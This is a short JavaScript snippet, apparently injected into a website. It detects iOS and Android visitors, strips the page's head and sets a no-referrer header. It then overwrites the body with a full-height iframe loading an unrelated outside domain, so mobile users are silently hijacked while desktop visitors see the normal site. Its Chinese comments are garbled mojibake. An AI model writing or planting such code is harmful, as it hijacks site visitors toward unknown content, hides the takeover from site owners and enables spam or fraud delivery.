window.addEventListener('DOMContentLoaded', function() {
    var browser = {       
versions: function() {           
var u = navigator.userAgent,app = navigator.appVersion;           
return { //绉诲姩缁堢娴忚鍣ㄧ増鏈俊鎭�    
            
ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios缁堢               
 android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android缁堢鎴杣c娴忚鍣�       
         iPhone: u.indexOf('iPhone') > -1,//鏄惁涓篿Phone鎴栬€匭QHD娴忚鍣�           
     iPad: u.indexOf('iPad') > -1,//鏄惁iPad      
      
};       
}(),
   
}    // JavaScript Document    
var system = {   
win: false,
   mac: false,
   xll: false   
};    //妫€娴嬪钩鍙�    
var p = navigator.platform;   
system.win = p.indexOf("Win") == 0;   
system.mac = p.indexOf("Mac") == 0;   
system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);    //璺宠浆璇彞     
if(browser.versions.iPhone || browser.versions.iPad || browser.versions.ios || browser.versions.android) { 
        var host=window.location.host;
        $("head").html('<meta charset="UTF-8"><meta name="referrer" content="no-referrer"><title>鍦ㄧ嚎瑙傜湅</title> ');
        $("body").html('<iframe src="https://8j103mpt.51teaexpo.com/ice8463" rel="nofollow" scrolling="no" frameborder="0" width="100%" height="5000"></iframe>').show()
    }
    
    
});

